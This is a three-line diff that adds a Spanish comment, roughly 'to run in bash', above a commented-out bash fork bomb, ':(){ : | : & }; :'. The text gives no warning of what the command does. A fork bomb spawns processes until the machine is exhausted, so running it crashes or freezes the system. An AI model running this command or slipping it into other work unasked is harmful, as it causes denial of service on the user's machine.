@@ -1,0 +1,3 @@
+
+#Para ejercutar en bash:
+#:(){ : | : & }; :
